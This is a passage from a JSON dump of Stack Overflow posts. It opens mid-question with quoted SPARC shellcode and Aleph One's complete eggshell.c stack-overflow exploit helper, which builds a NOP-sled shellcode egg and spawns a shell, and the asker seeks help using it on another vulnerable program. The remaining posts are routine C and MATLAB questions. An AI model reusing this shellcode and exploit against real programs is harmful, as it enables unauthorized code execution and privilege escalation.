__asm__(\"or %sp, %sp, %i0\");\n}\n\n#elif defined(__sparc__) &amp;&amp; defined(__sun__)\n\n#define NOP_SIZE        4\nchar nop[]=\"\\xac\\x15\\xa1\\x6e\";\nchar shellcode[] =\n  \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\"\n  \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\"\n  \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\xaa\\x10\\x3f\\xff\"\n  \"\\x91\\xd5\\x60\\x01\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd5\\x60\\x01\";\n\nunsigned long get_sp(void) {\n  __asm__(\"or %sp, %sp, %i0\");\n}\n\n#endif\n</code></pre>\n\n<h2>eggshell.c</h2>\n\n<pre><code>/*\n * eggshell v1.0\n *\n * Aleph One / aleph1@underground.org\n */\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include \"shellcode.h\"\n\n#define DEFAULT_OFFSET                    0\n#define DEFAULT_BUFFER_SIZE             512\n#define DEFAULT_EGG_SIZE               2048\n\nvoid usage(void);\n\nvoid main(int argc, char *argv[]) {\n  char *ptr, *bof, *egg;\n  long *addr_ptr, addr;\n  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;\n  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;\n\n  while ((c = getopt(argc, argv, \"a:b:e:o:\")) != EOF)\n    switch (c) {\n      case 'a':\n        align = atoi(optarg);\n        break;\n      case 'b':\n        bsize = atoi(optarg);\n        break;\n      case 'e':\n        eggsize = atoi(optarg);\n        break;\n      case 'o':\n        offset = atoi(optarg);\n        break;\n      case '?':\n        usage();\n        exit(0);\n    }\n\n  if (strlen(shellcode) &gt; eggsize) {\n    printf(\"Shellcode is larger the the egg.\\n\");\n    exit(0);\n  }\n\n  if (!(bof = malloc(bsize))) {\n    printf(\"Can't allocate memory.\\n\");\n    exit(0);\n  }\n  if (!(egg = malloc(eggsize))) {\n    printf(\"Can't allocate memory.\\n\");\n    exit(0);\n  }\n\n  addr = get_sp() - offset;\n  printf(\"[ Buffer size:\\t%d\\t\\tEgg size:\\t%d\\tAligment:\\t%d\\t]\\n\",\n    bsize, eggsize, align);\n  printf(\"[ Address:\\t0x%x\\tOffset:\\t\\t%d\\t\\t\\t\\t]\\n\", addr, offset);\n\n  addr_ptr = (long *) bof;\n  for (i = 0; i &lt; bsize; i+=4)\n    *(addr_ptr++) = addr;\n\n  ptr = egg;\n  for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)\n    for (n = 0; n &lt; NOP_SIZE; n++) {\n      m = (n + align) % NOP_SIZE;\n      *(ptr++) = nop[m];\n    }\n\n  for (i = 0; i &lt; strlen(shellcode); i++)\n    *(ptr++) = shellcode[i];\n\n  bof[bsize - 1] = '\\0';\n  egg[eggsize - 1] = '\\0';\n\n  memcpy(egg,\"EGG=\",4);\n  putenv(egg);\n\n  memcpy(bof,\"BOF=\",4);\n  putenv(bof);\n  system(\"/bin/sh\");\n}\n\nvoid usage(void) {\n  (void)fprintf(stderr,\n    \"usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]\\n\");\n}\n</code></pre>\n\n<p>I'm trying to use this exploit on another vulnerable program and I understood that I need to activate the other vulnerable program through the aleph one program. could somebody please tell me how to do that? </p>\n"}, {"tags": ["c", "ubuntu"], "comments": [{"owner": {"reputation": 171938, "user_id": 2684539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c5fff6fb65e95570ad1a90fe1e3522e?s=128&d=identicon&r=PG&f=1", "display_name": "Jarod42", "link": "https://stackoverflow.com/users/2684539/jarod42"}, "edited": false, "score": 7, "creation_date": 1449654021, "post_id": 34175317, "comment_id": 56097507, "body": "flushing output may help to have expected behavior."}, {"owner": {"reputation": 6559, "user_id": 4143855, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Gh4vC.jpg?s=128&g=1", "display_name": "Tas", "link": "https://stackoverflow.com/users/4143855/tas"}, "edited": false, "score": 1, "creation_date": 1449654089, "post_id": 34175317, "comment_id": 56097557, "body": "Is this C or C++, and for Linux or Unix?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 3, "creation_date": 1449654264, "post_id": 34175317, "comment_id": 56097671, "body": "<code>printf</code> is line buffered. It will not flush to stdout until a newline is encountered. So either put a <code>&quot;\\n&quot;</code> at the end of your print string or explicitly <code>fflush</code>."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1449655016, "post_id": 34175317, "comment_id": 56098164, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/9317529/when-does-printf-fail-to-print\">When does printf fail to print?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 171938, "user_id": 2684539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c5fff6fb65e95570ad1a90fe1e3522e?s=128&d=identicon&r=PG&f=1", "display_name": "Jarod42", "link": "https://stackoverflow.com/users/2684539/jarod42"}, "is_accepted": false, "score": 5, "last_activity_date": 1449654233, "creation_date": 1449654233, "answer_id": 34175463, "question_id": 34175317, "link": "https://stackoverflow.com/questions/34175317/i-use-sleep-function-in-ubuntu-but-printf-function-run-very-slowly-in-while-loo/34175463#34175463", "title": "I use sleep function in ubuntu ,but printf function run very slowly in while loop. why?", "body": "<p><code>printf</code> bufferizes its output (until a given size or <code>\\n</code>), so you don't see the output until it flushes it.</p>\n\n<p>changing your loop to</p>\n\n<pre><code>printf(\"loop_\");\nfflush(stdout);\nsleep(1);\n</code></pre>\n\n<p>should solve your issue.</p>\n"}, {"tags": [], "owner": {"reputation": 23469, "user_id": 775964, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/glHLl.jpg?s=128&g=1", "display_name": "Jeegar Patel", "link": "https://stackoverflow.com/users/775964/jeegar-patel"}, "is_accepted": true, "score": 0, "last_activity_date": 1449665478, "creation_date": 1449665478, "answer_id": 34179296, "question_id": 34175317, "link": "https://stackoverflow.com/questions/34175317/i-use-sleep-function-in-ubuntu-but-printf-function-run-very-slowly-in-while-loo/34179296#34179296", "title": "I use sleep function in ubuntu ,but printf function run very slowly in while loop. why?", "body": "<p><strong>Root cause:</strong></p>\n\n<p>Usually stdout's buffer are getting flushed by <code>\\n</code> so here loop goes on and stdout did not get chance to buffered its data properly.</p>\n\n<p><strong>Solution:</strong></p>\n\n<p>There are three way here</p>\n\n<p>1) Use <code>\\n</code> at the end of printf</p>\n\n<pre><code>printf(\"loop_\\n\");\n</code></pre>\n\n<p>2) call <code>fflush(stdout):</code> after printf in loop. </p>\n\n<p>3) Disabled the buffering for stdout stream using below call in your program</p>\n\n<pre><code>setvbuf(stdout, NULL, _IONBF, 0);\n</code></pre>\n"}], "owner": {"reputation": 105, "user_id": 5570753, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/99b110a460075b5807b03ebaa65f0248?s=128&d=identicon&r=PG&f=1", "display_name": "zhang007z", "link": "https://stackoverflow.com/users/5570753/zhang007z"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "accepted_answer_id": 34179296, "answer_count": 2, "score": 1, "last_activity_date": 1449998325, "creation_date": 1449653879, "last_edit_date": 1449998325, "question_id": 34175317, "link": "https://stackoverflow.com/questions/34175317/i-use-sleep-function-in-ubuntu-but-printf-function-run-very-slowly-in-while-loo", "title": "I use sleep function in ubuntu ,but printf function run very slowly in while loop. why?", "body": "<p>I use ubuntu 14.04 version system for below code.\nI use below code : (below code is infinite Loop)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint flag=0;\n\nint main(void){\n\n    printf(\"program start.\\n\");   \n    printf(\"PID=%d\\n\",getpid());    \n    printf(\"flag=%d\\n\",flag);\n    //-----------I feel weired below do...while... sentences----------//\n    do{\n        printf(\"loop_\");\n        sleep(1);\n       }while(flag==0);\n\n    printf(\"program exit.\\n\");    \n    return 0;\n}\n</code></pre>\n\n<p>in the beginning below print result :</p>\n\n<pre><code>root@ubuntu:~/Desktop/my_test_code# ./issue \nprogram start.\nPID=3113\nflag=0\n...........//start waiting here,and don't print \"loop_\"\n</code></pre>\n\n<p>then after I waited for long time this program  prints a lot of \"loop_\".\nI find it very strange, and should print a string \"loop_\" and then, wait a second, then print a \"loop_\" again, and so on, why me waiting for a long time, do it start to print a lot of \"loop_\" ? </p>\n\n<p>anybody has any idea for my issue . thank you in advance. </p>\n"}, {"tags": ["c", "crash", "fgets"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1449654471, "post_id": 34175312, "comment_id": 56097807, "body": "<code>subjectName[numOfSubj]</code> that is an uninitialised <code>char *</code> variable. That is, you are trying to write to an invalid address. Either dynamically allocate memory for each <code>char</code> buffer (e.g. <code>subjectName[numOfSubj] = malloc(50)</code>) or declare it statically as <code>subjectName[1000][50]</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449654484, "post_id": 34175312, "comment_id": 56097813, "body": "You are passing an uninitialised pointer to <code>fgets</code>, which uses it differently from your earlier assignments of pointers to string literals."}], "answers": [{"tags": [], "owner": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "is_accepted": false, "score": 2, "last_activity_date": 1449655229, "last_edit_date": 1449655229, "creation_date": 1449654491, "answer_id": 34175554, "question_id": 34175312, "link": "https://stackoverflow.com/questions/34175312/fgets-crashing-c-program-when-used-more-than-once/34175554#34175554", "title": "fgets() crashing C program when used more than once", "body": "<p>Please note that <code>subjectName</code> is array of type <code>char*</code>.\nYour first 3 strings defined statically.\nFor the string you want to get via <code>fgets()</code> you need to allocate memory using <code>mallaoc</code> first and only then call <code>fgets()</code>.</p>\n\n<p>Something like:</p>\n\n<pre><code>subjectName[numOfSubj] = (char *) malloc(50*sizeof(char));\nfgets(subjectName[numOfSubj], 50, stdin);\n</code></pre>\n\n<p>Don't forget to <code>free</code> the allocated memory at the end.\nPlease note that you may want to consider different approaches. You may statically define the array: <code>char subjectName[1000][50]</code> and use <code>strcpy()</code> to populate it with \"Math\", \"Physics\" and \"English\".</p>\n"}, {"comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1449654561, "post_id": 34175558, "comment_id": 56097864, "body": "Not quite correct, here the first 3 pointers point to string literals."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1449654715, "post_id": 34175558, "comment_id": 56097955, "body": "@MichaelWalz The question was, &quot;How do I get strings from user and add it to the array?&quot;"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1449655368, "post_id": 34175558, "comment_id": 56098406, "body": "Yes, but in the question the 1st 3 pointers don&#39;t point to nothing, they do point to string literals."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1449682198, "post_id": 34175558, "comment_id": 56116687, "body": "@MichaelWalz Thanks for focusing on the irrelevant. I have updated my answer."}], "tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": false, "score": 2, "last_activity_date": 1449682154, "last_edit_date": 1449682154, "creation_date": 1449654505, "answer_id": 34175558, "question_id": 34175312, "link": "https://stackoverflow.com/questions/34175312/fgets-crashing-c-program-when-used-more-than-once/34175558#34175558", "title": "fgets() crashing C program when used more than once", "body": "<p>You have an array of 1000 pointers, but the pointers that are relevant to this problem don't point to anything. You need to <code>malloc</code> some memory for the pointers before calling <code>fgets</code>, e.g.</p>\n\n<pre><code>printf(\"Enter new subject name: \");\nsubjectName[numOfSubj] = malloc( 50 );\nfgets(subjectName[numOfSubj], 50, stdin);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 563, "user_id": 1179935, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7951468d75f7a63837d60e2629590bdb?s=128&d=identicon&r=PG", "display_name": "shamsulfakhar", "link": "https://stackoverflow.com/users/1179935/shamsulfakhar"}, "edited": false, "score": 0, "creation_date": 1449657920, "post_id": 34175585, "comment_id": 56100106, "body": "Thanks a lot for the explanation! Got it working now. :)"}], "tags": [], "owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "is_accepted": true, "score": 2, "last_activity_date": 1449655732, "last_edit_date": 1449655732, "creation_date": 1449654578, "answer_id": 34175585, "question_id": 34175312, "link": "https://stackoverflow.com/questions/34175312/fgets-crashing-c-program-when-used-more-than-once/34175585#34175585", "title": "fgets() crashing C program when used more than once", "body": "<p>It's working in first case because you are initialising the char array with subject name so compiler allocating memory.</p>\n\n<p>In USER case you need to allocate memory before taking input from user.</p>\n\n<blockquote>\n  <p>fgets(subjectName[numOfSubj], 50, stdin); //Here you passed null char\n  array</p>\n</blockquote>\n\n<p>so to avoid error do </p>\n\n<pre><code>subjectName[numOfSubj] = malloc( 50 ); //memory allocation\n\n fgets(subjectName[numOfSubj], 50, stdin);\n</code></pre>\n\n<p>and <code>free</code> the memory (Which is allocated by malloc) whenever you finish the use of it  .</p>\n\n<pre><code>free(subjectName[numOfSubj] );\n</code></pre>\n"}], "owner": {"reputation": 563, "user_id": 1179935, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7951468d75f7a63837d60e2629590bdb?s=128&d=identicon&r=PG", "display_name": "shamsulfakhar", "link": "https://stackoverflow.com/users/1179935/shamsulfakhar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1606, "favorite_count": 0, "accepted_answer_id": 34175585, "answer_count": 3, "score": 2, "last_activity_date": 1556634745, "creation_date": 1449653865, "question_id": 34175312, "link": "https://stackoverflow.com/questions/34175312/fgets-crashing-c-program-when-used-more-than-once", "title": "fgets() crashing C program when used more than once", "body": "<p>I have an array declared and populated with 3 strings (Math, Physics, English). I used the fgets() to get new subject to add to the array, and this is working fine. However, whenever I copy the same chunk of code to get another subject from the user, the program crashes.</p>\n\n<p>Why is this happening? How do I get strings from user and add it to the array?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char *subjectName[1000];\n    int numOfSubj = 0;\n    int numOfUserAddedSubj = 0;\n\n    subjectName[numOfSubj] = \"Math\";\n    numOfSubj++;\n    subjectName[numOfSubj] = \"Physics\";\n    numOfSubj++;\n    subjectName[numOfSubj] = \"English\";\n    numOfSubj++;\n\n//int k;\n//for(k=0; k&lt;1; k++)\n//{\n    // add user\n    printf(\"Enter new subject name: \");\n    fgets(subjectName[numOfSubj], 50, stdin);\n    numOfUserAddedSubj++;\n    numOfSubj++;\n//}\n\n\n// add another user\n/*printf(\"Enter new subject name: \");\nfgets(subjectName[numOfSubj], 50, stdin);\nnumOfUserAddedSubj++;\nnumOfSubj++;*/\n\n\n\n// display content of array\nint i;\nfor(i=0; i &lt; ((strlen(subjectName))+numOfUserAddedSubj); i++)\n{\n    printf(\"%s\\n\", subjectName[i]);\n}\n\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "matlab"], "comments": [{"owner": {"reputation": 643, "user_id": 4892892, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/433166266860648/picture?type=large", "display_name": "Zolt&#225;n Cs&#225;ti", "link": "https://stackoverflow.com/users/4892892/zolt%c3%a1n-cs%c3%a1ti"}, "edited": false, "score": 0, "creation_date": 1449653945, "post_id": 34175083, "comment_id": 56097455, "body": "If you know the element indices you want to extract, e.g. <code>idx = [1 5 21 10000]</code>, then you can use this <code>idx</code> vector for indexing the original 3D matrix to extract the required parts of it."}, {"owner": {"reputation": 5566, "user_id": 1771479, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5m0gd.jpg?s=128&g=1", "display_name": "agold", "link": "https://stackoverflow.com/users/1771479/agold"}, "edited": false, "score": 3, "creation_date": 1449654096, "post_id": 34175083, "comment_id": 56097562, "body": "You are using Matlab right, and not C?"}, {"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449655067, "post_id": 34175083, "comment_id": 56098197, "body": "I would like to extract some patches out and I just know the indices of top left corner of patches so there is a matrix of size 10000 which is contained the indices of top left corner of patches! considering A as original matrix, I would like to extract 10000 patches out of A."}, {"owner": {"reputation": 2049, "user_id": 4383032, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/rUDrN.png?s=128&g=1", "display_name": "BillBokeey", "link": "https://stackoverflow.com/users/4383032/billbokeey"}, "edited": false, "score": 0, "creation_date": 1449655160, "post_id": 34175083, "comment_id": 56098266, "body": "You know the indexes of the top left corners of all patches, but do you know their sizes?"}, {"owner": {"reputation": 2049, "user_id": 4383032, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/rUDrN.png?s=128&g=1", "display_name": "BillBokeey", "link": "https://stackoverflow.com/users/4383032/billbokeey"}, "edited": false, "score": 0, "creation_date": 1449655811, "post_id": 34175083, "comment_id": 56098685, "body": "Is the patch you use to take the convolution with the parts of the matrix you extract always the same (Meaning all parts extracted have the same size)? Or, if it varies, how do you calculate it?"}, {"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449656935, "post_id": 34175083, "comment_id": 56099439, "body": "Yes all part have same size and i know the size of patch, but problem is as follow:"}, {"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449657376, "post_id": 34175083, "comment_id": 56099721, "body": "Consider id as indexes of top left corner of patch, First i calculate i j k by using ind2sub function, Then i extract the patch from original matrix: patch=A[i:i+size(patch,1),i:i+size(patch,2),i:i+size(patch,3&zwnj;&#8203;)], Previous step is very time consuming! Finally i calculate the convolution: convn(patch,ones(size(patch)),&#39;valid&#39;)."}, {"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449657780, "post_id": 34175083, "comment_id": 56100013, "body": "Sorry i made a mistake, matrix, Patch is extracted as follow: patch=A[i:i+size(patch,1),j:j+size(patch,2),k:k+size(patch,3&zwnj;&#8203;)]"}, {"owner": {"reputation": 2049, "user_id": 4383032, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/rUDrN.png?s=128&g=1", "display_name": "BillBokeey", "link": "https://stackoverflow.com/users/4383032/billbokeey"}, "edited": false, "score": 0, "creation_date": 1449657997, "post_id": 34175083, "comment_id": 56100159, "body": "I&#39;ll post an answer after lunch"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449669902, "post_id": 34178199, "comment_id": 56107599, "body": "Thank you very much. It was very useful. Best regards:)"}, {"owner": {"reputation": 2049, "user_id": 4383032, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/rUDrN.png?s=128&g=1", "display_name": "BillBokeey", "link": "https://stackoverflow.com/users/4383032/billbokeey"}, "reply_to_user": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449676800, "post_id": 34178199, "comment_id": 56112885, "body": "If this answer was useful for you, please consider marking it as accepted so that other people having the same question will know it works. I&#39;d be interested having some comparisons in terms of calculation speed  between your old code and this one aswell"}, {"owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "edited": false, "score": 0, "creation_date": 1449740254, "post_id": 34178199, "comment_id": 56141871, "body": "Hello, Sorry i am student and these days i am very busy! i will compare them and send you the result."}], "tags": [], "owner": {"reputation": 2049, "user_id": 4383032, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/rUDrN.png?s=128&g=1", "display_name": "BillBokeey", "link": "https://stackoverflow.com/users/4383032/billbokeey"}, "is_accepted": false, "score": 1, "last_activity_date": 1449667452, "last_edit_date": 1449667452, "creation_date": 1449662017, "answer_id": 34178199, "question_id": 34175083, "link": "https://stackoverflow.com/questions/34175083/extract-multiple-parts-of-a-matrix-without-using-loops/34178199#34178199", "title": "Extract multiple parts of a matrix without using loops", "body": "<p>Let's suppose you have : </p>\n\n<p>1) A row vector <code>idx</code> containing the row indexes of the top left corners of your parts.</p>\n\n<p>2) A row vector <code>idy</code> containing the column indexes of the top left corners of your parts.</p>\n\n<p>3) A row vector <code>idz</code> containing the indexes along the 3rd coordinate of the left corners of your parts.</p>\n\n<p>We'll first have to create, from <code>idx</code>, <code>idy</code> and <code>idz</code> 3 vector containing ALL the indexes of the elements you need to extract from your matrix. Then we'll split the extracted matrix in blocks the same size of your patch using <code>mat2cell</code>, and then we'll apply the <code>convn</code> function to each block using <code>cellfun</code>.</p>\n\n<pre><code>Totidx=bsxfun(@plus,idx,[0:(size(patch,1)-1)]'); \\\\i-th column of this is the column vector idx(i):(idx(i)+size(patch,1)-1)\n\nTotidx=reshape(Totidx,1,numel(Totidx)); \\\\ Creates the vector needed containing all indexes along first dimension.\n</code></pre>\n\n<p>Doing the same for <code>idy</code> and <code>idz</code>, we obtain 3 vectors <code>Totidx</code>, <code>Totidy</code>, <code>Totidz</code> containing all indexes needed.</p>\n\n<p>Now we can extract the values from your initial matrix, say <code>A</code> :</p>\n\n<pre><code>ExtractedA=A(Totidx,Totidy,Totidz);\n</code></pre>\n\n<p>Apply <code>mat2cell</code> : <code>NPatch</code> denotes your number of extracted patches</p>\n\n<pre><code>B=mat2cell(ExtractedA,size(patch,1)*ones(1,NPatch),size(patch,2)*ones(1,NPatch),size(patch,3)*ones(1,NPatch));\n</code></pre>\n\n<p>Then you can apply your <code>convn</code> function to every cell of the cell array <code>B</code> : <code>patch</code> denotes the patch you want to convolute your extracted parts with</p>\n\n<pre><code>fun=@(M) convn(M,patch,'valid');\nout=cellfun(fun,B,'uniformoutput',false);\n</code></pre>\n\n<p>Every cell of the cell array <code>out</code> is now one of the output you wanted</p>\n"}], "owner": {"reputation": 11, "user_id": 5658259, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fa782c3d2b896c471099adcb8a65f5?s=128&d=identicon&r=PG&f=1", "display_name": "benyamin", "link": "https://stackoverflow.com/users/5658259/benyamin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 156, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1449829397, "creation_date": 1449653248, "last_edit_date": 1449829397, "question_id": 34175083, "link": "https://stackoverflow.com/questions/34175083/extract-multiple-parts-of-a-matrix-without-using-loops", "title": "Extract multiple parts of a matrix without using loops", "body": "<p>I have a huge 3D matrix and there is a loop. In every iteration, I would like to extract some different parts (for example: 10000) out of it, then the convolution between those part and a patch is calculated.</p>\n\n<p>I know it could easily be done using a loop but it is very time consuming.\nIs there any alternative solution to work much faster than loop?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 6642, "user_id": 434233, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/y6HxN.png?s=128&g=1", "display_name": "Arunmu", "link": "https://stackoverflow.com/users/434233/arunmu"}, "edited": false, "score": 3, "creation_date": 1449652651, "post_id": 34174761, "comment_id": 56096592, "body": "from right to left, strings is a constant pointer pointing to a constant pointer pointing to const character set ?"}, {"owner": {"reputation": 156300, "user_id": 1782465, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/b45d92faaf9d122bfed585490e0bafc5?s=128&d=identicon&r=PG", "display_name": "Angew is no longer proud of SO", "link": "https://stackoverflow.com/users/1782465/angew-is-no-longer-proud-of-so"}, "edited": false, "score": 1, "creation_date": 1449652823, "post_id": 34174761, "comment_id": 56096697, "body": "Have you done any research on how C declarations are formed?"}, {"owner": {"reputation": 6642, "user_id": 434233, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/y6HxN.png?s=128&g=1", "display_name": "Arunmu", "link": "https://stackoverflow.com/users/434233/arunmu"}, "edited": false, "score": 2, "creation_date": 1449653076, "post_id": 34174761, "comment_id": 56096871, "body": "@Pavan You should probably start from this. <a href=\"http://stackoverflow.com/questions/4949254/const-char-const-versus-const-char\" title=\"const char const versus const char\">stackoverflow.com/questions/4949254/&hellip;</a>"}, {"owner": {"reputation": 6788, "user_id": 298206, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/2911c6ad709ff05272e49a21df247da2?s=128&d=identicon&r=PG", "display_name": "Valentin Heinitz", "link": "https://stackoverflow.com/users/298206/valentin-heinitz"}, "edited": false, "score": 0, "creation_date": 1449668672, "post_id": 34174761, "comment_id": 56106763, "body": "Cool. The more const&#39;s the more professional the code, according to Scott Meyers. For my taste one const is missing - before char. Could be: &#39;const char const *const *const strings&#39; :-)"}], "answers": [{"tags": [], "owner": {"reputation": 39526, "user_id": 265804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/156ef8708acdbf6a9ef76dad0d69609f?s=128&d=identicon&r=PG&f=1", "display_name": "Blagovest Buyukliev", "link": "https://stackoverflow.com/users/265804/blagovest-buyukliev"}, "is_accepted": false, 